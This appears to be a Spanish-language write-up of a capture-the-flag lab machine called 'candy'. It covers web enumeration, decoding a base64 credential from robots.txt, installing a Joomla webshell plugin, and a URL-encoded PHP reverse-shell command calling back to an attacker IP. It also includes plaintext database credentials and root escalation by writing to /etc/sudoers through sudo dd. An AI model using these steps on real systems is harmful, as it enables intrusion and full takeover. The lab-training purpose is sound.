---
Maquina: candy
SO: Linux
Explotación: Análisis web (LFI) Y Fuerza Bruta
Escala_privs: Permisos sudo
Dificultad: Fácil
tags:
  - maquina
  - web_discovery
  - linux
  - escala_privs
  - ssh
  - RCE
---
## Reconocimiento

1. **Explorar los puerto abiertos del docker**: 

```bash 
nmap -p- --open --min-rate 5000 -sS -Pn 172.17.0.2
```

![[Pasted image 20241113084503.png]]

Tal y como se aprecio tan solo tenemos el puerto 80 activo, así que vamos a tener que realizar un descubrimiento web exhaustivo. Vamos a seguir el mismo procedimiento de siempre, el panel principal es el siguiente ->

![[Pasted image 20241113090859.png]]

1. Vamos a analizar el código fuente de la web en busca de comentarios.
	1. No parece haber nada de interés.
2. Vamos a intentar pasar un firb o un gobuster para listar los subdirectorios.
	1. Resulta que la web da todo códigos 200 pero sin información aparente con dirb. En cambio con gobuster y si filtramos por webs con código 200 si que tendremos cosas interesante

```bash
gobuster dir -u http://172.17.0.2 -w /home/alejandro/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,py,js,txt -s 200 -b ""
```

![[Pasted image 20241113090736.png]]

Y fijaos que mensaje más curioso hay en robots.txt ->

![[Pasted image 20241113090755.png]]

Nos acaban de dar el siguiente usuario -> admin:c2FubHVpczEyMzQ1. Si vamos a probarlo en el panel de login de la página principal nos dará fallo, y si nos fijamos un poco más en la passwd...

admin:c2FubHVpczEyMzQ1 -> Base64 decode -> admin:sanluis12345

![[Pasted image 20241113093005.png]]

Estamos dentro, pero hay poca información como tal.

Pero también parece que en el robots.txt no quiere que vayamos al /administrator/...

![[Pasted image 20241113091509.png]]

Parece otro panel de login... Sospechoso... y si probramos las mismas credenciales...

![[Pasted image 20241113092948.png]]

Esto me gusta mucho más, vamos a probar a modificar el index de la página principal y añadir un reverse shell y ver si podemos intentar conectarlos a la máquina.

Para ello vamos a utilizar este repositorio de git que explica como subir un plugin malicioso -> https://github.com/p0dalirius/Joomla-webshell-plugin?tab=readme-ov-file

Y ahora podemos tener ejecución de comandos de la víctima.

![[Pasted image 20241113142832.png]]

Si le pasamos el siguiente comando por url podremos mandar una petición de conexión a nuestro ordenador ->

```bash
php%20-r%20%27%24sock%3Dfsockopen%28%22172.17.0.1%22%2C4444%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```

Y con eso tendremos acceso al host ->

![[Pasted image 20241113143005.png]]

Ahora toca el tratamiento de la tty y ver los permisos que tenemos ;)

Investigando un poco me he dispuesto a buscar por el sistema el nombre de luisillo y he encontrado lo siguiente ->

```bash
find / -user luisillo 2>/dev/null
```

![[Pasted image 20241113144912.png]]

Y parece que tenemos algo interesante ->

![[Pasted image 20241113144928.png]]

```bash
$db_user = 'luisillo';
$db_pass = 'luisillosuperpassword';
```

![[Pasted image 20241113145000.png]]

Parece que si que funciona ;)

![[Pasted image 20241113145126.png]]

Parece que tenemos permisos para escribir en cualquier archivo... hmmmmm...

```bash
LFILE=/etc/sudoers
echo "luisillo ALL=(ALL:ALL) ALL" | sudo dd of=$LFILE
```

Con esto nos podemos dar todos los permisos del mundo a luisillo jijiji.

![[Pasted image 20241113150006.png]]

Y otra máquina completada ;)